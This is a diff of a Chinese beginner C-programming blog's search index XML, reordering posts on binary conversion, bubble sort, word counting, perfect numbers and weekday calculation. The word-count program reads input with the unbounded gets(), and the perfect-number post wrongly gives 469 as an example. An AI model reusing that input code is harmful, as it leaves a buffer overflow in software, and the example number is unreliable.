class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	<span class="keyword">long</span> y=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一个整数："</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</span><br><span class="line">	y=stoe(x);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"十进制：%d\n二进制%ld\n"</span>,x,y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2019/08/18/lonelynumber/lonely-number.jpg" alt></p>
+<p><img src="//czheisenberg.github.io/2019/07/16/十进制转二进制/3.png" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -708,45 +757,6 @@
       </tags>
   </entry>
   <entry>
-    <title>十进制转二进制</title>
-    <url>/2019/07/16/%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E4%BA%8C%E8%BF%9B%E5%88%B6/</url>
-    <content><![CDATA[<h1 id="十进制转二进制"><a href="#十进制转二进制" class="headerlink" title="十进制转二进制"></a>十进制转二进制</h1><p>编写一个C程序实现进制转换：  </p>
-<p>10 to 2:</p>
-<p>源代码：  </p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stoe</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,e=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">long</span> sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(number)</span><br><span class="line">	&#123;</span><br><span class="line">		sum+=number%<span class="number">2</span>*e;</span><br><span class="line">		number/=<span class="number">2</span>;</span><br><span class="line">		e*=<span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	<span class="keyword">long</span> y=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一个整数："</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;x);</span><br><span class="line">	y=stoe(x);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"十进制：%d\n二进制%ld\n"</span>,x,y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2019/07/16/十进制转二进制/3.png" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>冒泡法排序</title>
-    <url>/2019/07/17/%E5%86%92%E6%B3%A1%E6%B3%95%E6%8E%92%E5%BA%8F/</url>
-    <content><![CDATA[<h1 id="冒泡法排序"><a href="#冒泡法排序" class="headerlink" title="冒泡法排序"></a>冒泡法排序</h1><p>冒泡法排序：  </p>
-<p>源代码：  </p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入%d个数：\n"</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N<span class="number">-1</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(j=N<span class="number">-1</span>;j&gt;i;j--)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(a[j]&gt;a[j<span class="number">-1</span>])          <span class="comment">// &gt; 为降序，&lt; 为升序</span></span><br><span class="line">						&#123;</span><br><span class="line">							t=a[j],a[j]=a[j<span class="number">-1</span>],a[j<span class="number">-1</span>]=t;</span><br><span class="line">						&#125;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"冒泡法排序 降序：\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">			</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2019/07/17/冒泡法排序/7.png" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>二分查找</title>
     <url>/2019/08/17/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</url>
     <content><![CDATA[<h1 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h1><p>输入一个数，确定它在数组中的位置，如果没有这个数输出-1，否则输出它的下标！</p>
@@ -757,25 +767,6 @@
 
 <p>运行结果：  </p>
 <p><img src="//czheisenberg.github.io/2019/08/17/二分查找/2.jpg" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>单词个数</title>
-    <url>/2019/07/19/%E5%8D%95%E8%AF%8D%E4%B8%AA%E6%95%B0/</url>
-    <content><![CDATA[<h1 id="单词个数"><a href="#单词个数" class="headerlink" title="单词个数"></a>单词个数</h1><p>编写一个程序记录这行一共有多少个单词！  </p>
-<p>源代码：  </p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> ch[N];</span><br><span class="line">	<span class="keyword">int</span> i,sum=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一句话：\n"</span>);</span><br><span class="line">	gets(ch);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;ch[i]!=<span class="string">'\0'</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(ch[i]!=<span class="string">' '</span>&amp;&amp;(ch[i+<span class="number">1</span>]==<span class="string">' '</span>||ch[i+<span class="number">1</span>]==<span class="string">'\0'</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					sum++;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"一共有 %d 个单词！\n"</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2019/07/19/单词个数/1.jpg" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -796,6 +787,25 @@
 
 <p>运行结果：  </p>
 <p><img src="//czheisenberg.github.io/2019/07/16/十进制转二进制数组/4.png" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>冒泡法排序</title>
+    <url>/2019/07/17/%E5%86%92%E6%B3%A1%E6%B3%95%E6%8E%92%E5%BA%8F/</url>
+    <content><![CDATA[<h1 id="冒泡法排序"><a href="#冒泡法排序" class="headerlink" title="冒泡法排序"></a>冒泡法排序</h1><p>冒泡法排序：  </p>
+<p>源代码：  </p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入%d个数：\n"</span>,N);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N<span class="number">-1</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(j=N<span class="number">-1</span>;j&gt;i;j--)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span>(a[j]&gt;a[j<span class="number">-1</span>])          <span class="comment">// &gt; 为降序，&lt; 为升序</span></span><br><span class="line">						&#123;</span><br><span class="line">							t=a[j],a[j]=a[j<span class="number">-1</span>],a[j<span class="number">-1</span>]=t;</span><br><span class="line">						&#125;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"冒泡法排序 降序：\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">			</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：  </p>
+<p><img src="//czheisenberg.github.io/2019/07/17/冒泡法排序/7.png" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -847,15 +857,22 @@
       </tags>
   </entry>
   <entry>
-    <title>图形</title>
-    <url>/2019/08/17/%E5%9B%BE%E5%BD%A2/</url>
-    <content><![CDATA[]]></content>
+    <title>单词个数</title>
+    <url>/2019/07/19/%E5%8D%95%E8%AF%8D%E4%B8%AA%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="单词个数"><a href="#单词个数" class="headerlink" title="单词个数"></a>单词个数</h1><p>编写一个程序记录这行一共有多少个单词！  </p>
+<p>源代码：  </p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> ch[N];</span><br><span class="line">	<span class="keyword">int</span> i,sum=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一句话：\n"</span>);</span><br><span class="line">	gets(ch);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;ch[i]!=<span class="string">'\0'</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(ch[i]!=<span class="string">' '</span>&amp;&amp;(ch[i+<span class="number">1</span>]==<span class="string">' '</span>||ch[i+<span class="number">1</span>]==<span class="string">'\0'</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					sum++;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"一共有 %d 个单词！\n"</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：  </p>
+<p><img src="//czheisenberg.github.io/2019/07/19/单词个数/1.jpg" alt></p>
+]]></content>
       <categories>
         <category>C语言</category>
       </categories>
       <tags>
         <tag>C</tag>
-        <tag>C语言数列</tag>
       </tags>
   </entry>
   <entry>
@@ -919,26 +936,6 @@
       </tags>
   </entry>
   <entry>
-    <title>完全数</title>
-    <url>/2019/07/26/%E5%AE%8C%E5%85%A8%E6%95%B0/</url>
-    <content><![CDATA[<h1 id="完全数（Perfect-number）"><a href="#完全数（Perfect-number）" class="headerlink" title="完全数（Perfect number）"></a>完全数（Perfect number）</h1><p>判断一个数是否为完全数（Perfect number）  </p>
-<p>如果一个数恰好等于它的因子之和，则称该数为“完全数”  </p>
-<p>如： 6 ，28, 469 ……  </p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> number,sum=<span class="number">0</span>,i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一个数：\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;number);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=number/<span class="number">2</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(number%i==<span class="number">0</span>)</span><br><span class="line">				sum+=i;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">if</span>(number==sum)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d是完数\n"</span>,number);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d不是完数\n"</span>,number);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果： </p>
-<p><img src="//czheisenberg.github.io/2019/07/26/完全数/01.jpg" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>开机时间</title>
     <url>/2019/08/24/%E5%BC%80%E6%9C%BA%E6%97%B6%E9%97%B4/</url>
     <content><![CDATA[<h1 id="获取系统已开机时间"><a href="#获取系统已开机时间" class="headerlink" title="获取系统已开机时间"></a>获取系统已开机时间</h1><p>来自百度  </p>
@@ -960,6 +957,18 @@
       </tags>
   </entry>
   <entry>
+    <title>图形</title>
+    <url>/2019/08/17/%E5%9B%BE%E5%BD%A2/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+        <tag>C语言数列</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>提取数字或字母</title>
     <url>/2019/09/06/%E6%8F%90%E5%8F%96%E6%95%B0%E5%AD%97%E6%88%96%E5%AD%97%E6%AF%8D/</url>
     <content><![CDATA[<p>提取数字或字母  </p>
@@ -971,6 +980,26 @@
 
 <p>运行结果：  </p>
 <p><img src="//czheisenberg.github.io/2019/09/06/提取数字或字母/zm.jpg" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>完全数</title>
+    <url>/2019/07/26/%E5%AE%8C%E5%85%A8%E6%95%B0/</url>
+    <content><![CDATA[<h1 id="完全数（Perfect-number）"><a href="#完全数（Perfect-number）" class="headerlink" title="完全数（Perfect number）"></a>完全数（Perfect number）</h1><p>判断一个数是否为完全数（Perfect number）  </p>
+<p>如果一个数恰好等于它的因子之和，则称该数为“完全数”  </p>
+<p>如： 6 ，28, 469 ……  </p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> number,sum=<span class="number">0</span>,i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入一个数：\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;number);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=number/<span class="number">2</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(number%i==<span class="number">0</span>)</span><br><span class="line">				sum+=i;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">if</span>(number==sum)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d是完数\n"</span>,number);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d不是完数\n"</span>,number);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果： </p>
+<p><img src="//czheisenberg.github.io/2019/07/26/完全数/01.jpg" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -996,6 +1025,30 @@
       </categories>
       <tags>
         <tag>C语言有趣程序</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>星期计算</title>
+    <url>/2019/08/22/%E6%98%9F%E6%9C%9F%E8%AE%A1%E7%AE%97/</url>
+    <content><![CDATA[<h1 id="基姆拉尔森计算公式"><a href="#基姆拉尔森计算公式" class="headerlink" title="基姆拉尔森计算公式"></a>基姆拉尔森计算公式</h1><p>通过使用基姆拉尔森计算公式计算星期几！！！  </p>
+<p>W= (d+2<em>m+3</em>(m+1)/5+y+y/4-y/100+y/400+1)%7   </p>
+<p>公式中d表示日期中的日数，m表示月份数，y表示年数  </p>
+<p><strong>注意</strong>：把一月和二月看成是上一年的十三月和十四月，例：如果是2004-1-10则换算成：2003-13-10来代入公式计算。</p>
+<p>源代码：  </p>
+<a id="more"></a> 
+
+<h2 id="①："><a href="#①：" class="headerlink" title="①："></a>①：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *weekday[<span class="number">7</span>]=&#123;<span class="string">"Sunday"</span>,<span class="string">"Monday"</span>,<span class="string">"Tuesday"</span>,<span class="string">"Wednesday"</span>,<span class="string">"Thursday"</span>,<span class="string">"Friday"</span>,<span class="string">"Saturday"</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> year,month,day,w;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入年/月/日:\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;year,&amp;month,&amp;day);</span><br><span class="line">	<span class="keyword">if</span>(month==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			month=<span class="number">13</span>;</span><br><span class="line">			year--;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(month==<span class="number">2</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				month=<span class="number">14</span>;</span><br><span class="line">				year--;</span><br><span class="line">			&#125;</span><br><span class="line">	w=(day+<span class="number">2</span>*month+<span class="number">3</span>*(month+<span class="number">1</span>)/<span class="number">5</span>+year+year/<span class="number">4</span>-year/<span class="number">100</span>+year/<span class="number">400</span>+<span class="number">1</span>)%<span class="number">7</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d/%d/%d :%s\n"</span>,year,month,day,weekday[w]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="②："><a href="#②：" class="headerlink" title="②："></a>②：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> year,month,day,weekday;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入年/月/日:\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;year,&amp;month,&amp;day);</span><br><span class="line">	<span class="keyword">if</span>(month==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			month=<span class="number">13</span>;</span><br><span class="line">			year--;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(month==<span class="number">2</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				month=<span class="number">14</span>;</span><br><span class="line">				year--;</span><br><span class="line">			&#125;</span><br><span class="line">	weekday=(day+<span class="number">2</span>*month+<span class="number">3</span>*(month+<span class="number">1</span>)/<span class="number">5</span>+year+year/<span class="number">4</span>-year/<span class="number">100</span>+year/<span class="number">400</span>+<span class="number">1</span>)%<span class="number">7</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d/%d/%d :"</span>,year,month,day);</span><br><span class="line">	<span class="keyword">switch</span>(weekday)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">puts</span>(<span class="string">"Sunday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:<span class="built_in">puts</span>(<span class="string">"Monday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:<span class="built_in">puts</span>(<span class="string">"Tuesday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:<span class="built_in">puts</span>(<span class="string">"Wednesday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:<span class="built_in">puts</span>(<span class="string">"Thursday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>:<span class="built_in">puts</span>(<span class="string">"Friday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">6</span>:<span class="built_in">puts</span>(<span class="string">"Saturday"</span>);<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果： </p>
+<p><img src="//czheisenberg.github.io/2019/08/22/星期计算/x.jpg" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
       </tags>
   </entry>
   <entry>
@@ -1036,30 +1089,6 @@
 
 <p>运行结果：  </p>
 <p><img src="//czheisenberg.github.io/2019/07/16/水仙花/5.png" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>星期计算</title>
-    <url>/2019/08/22/%E6%98%9F%E6%9C%9F%E8%AE%A1%E7%AE%97/</url>
-    <content><![CDATA[<h1 id="基姆拉尔森计算公式"><a href="#基姆拉尔森计算公式" class="headerlink" title="基姆拉尔森计算公式"></a>基姆拉尔森计算公式</h1><p>通过使用基姆拉尔森计算公式计算星期几！！！  </p>
-<p>W= (d+2<em>m+3</em>(m+1)/5+y+y/4-y/100+y/400+1)%7   </p>
-<p>公式中d表示日期中的日数，m表示月份数，y表示年数  </p>
-<p><strong>注意</strong>：把一月和二月看成是上一年的十三月和十四月，例：如果是2004-1-10则换算成：2003-13-10来代入公式计算。</p>
-<p>源代码：  </p>
-<a id="more"></a> 
-
-<h2 id="①："><a href="#①：" class="headerlink" title="①："></a>①：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *weekday[<span class="number">7</span>]=&#123;<span class="string">"Sunday"</span>,<span class="string">"Monday"</span>,<span class="string">"Tuesday"</span>,<span class="string">"Wednesday"</span>,<span class="string">"Thursday"</span>,<span class="string">"Friday"</span>,<span class="string">"Saturday"</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> year,month,day,w;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入年/月/日:\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;year,&amp;month,&amp;day);</span><br><span class="line">	<span class="keyword">if</span>(month==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			month=<span class="number">13</span>;</span><br><span class="line">			year--;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(month==<span class="number">2</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				month=<span class="number">14</span>;</span><br><span class="line">				year--;</span><br><span class="line">			&#125;</span><br><span class="line">	w=(day+<span class="number">2</span>*month+<span class="number">3</span>*(month+<span class="number">1</span>)/<span class="number">5</span>+year+year/<span class="number">4</span>-year/<span class="number">100</span>+year/<span class="number">400</span>+<span class="number">1</span>)%<span class="number">7</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d/%d/%d :%s\n"</span>,year,month,day,weekday[w]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="②："><a href="#②：" class="headerlink" title="②："></a>②：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> year,month,day,weekday;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"请输入年/月/日:\n"</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;year,&amp;month,&amp;day);</span><br><span class="line">	<span class="keyword">if</span>(month==<span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			month=<span class="number">13</span>;</span><br><span class="line">			year--;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(month==<span class="number">2</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				month=<span class="number">14</span>;</span><br><span class="line">				year--;</span><br><span class="line">			&#125;</span><br><span class="line">	weekday=(day+<span class="number">2</span>*month+<span class="number">3</span>*(month+<span class="number">1</span>)/<span class="number">5</span>+year+year/<span class="number">4</span>-year/<span class="number">100</span>+year/<span class="number">400</span>+<span class="number">1</span>)%<span class="number">7</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%d/%d/%d :"</span>,year,month,day);</span><br><span class="line">	<span class="keyword">switch</span>(weekday)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:<span class="built_in">puts</span>(<span class="string">"Sunday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:<span class="built_in">puts</span>(<span class="string">"Monday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:<span class="built_in">puts</span>(<span class="string">"Tuesday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:<span class="built_in">puts</span>(<span class="string">"Wednesday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:<span class="built_in">puts</span>(<span class="string">"Thursday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>:<span class="built_in">puts</span>(<span class="string">"Friday"</span>);<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">6</span>:<span class="built_in">puts</span>(<span class="string">"Saturday"</span>);<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果： </p>
-<p><img src="//czheisenberg.github.io/2019/08/22/星期计算/x.jpg" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -1193,6 +1222,25 @@
       </tags>
   </entry>
   <entry>
+    <title>顺序查找</title>
+    <url>/2019/08/17/%E9%A1%BA%E5%BA%8F%E6%9F%A5%E6%89%BE/</url>
+    <content><![CDATA[<h1 id="顺序查找"><a href="#顺序查找" class="headerlink" title="顺序查找"></a>顺序查找</h1><p>输入一个数，确定它在数组中的位置，如果没有这个数输出-1，否则输出它的下标！</p>
+<p>源代码：</p>
+<a id="more"></a>
+
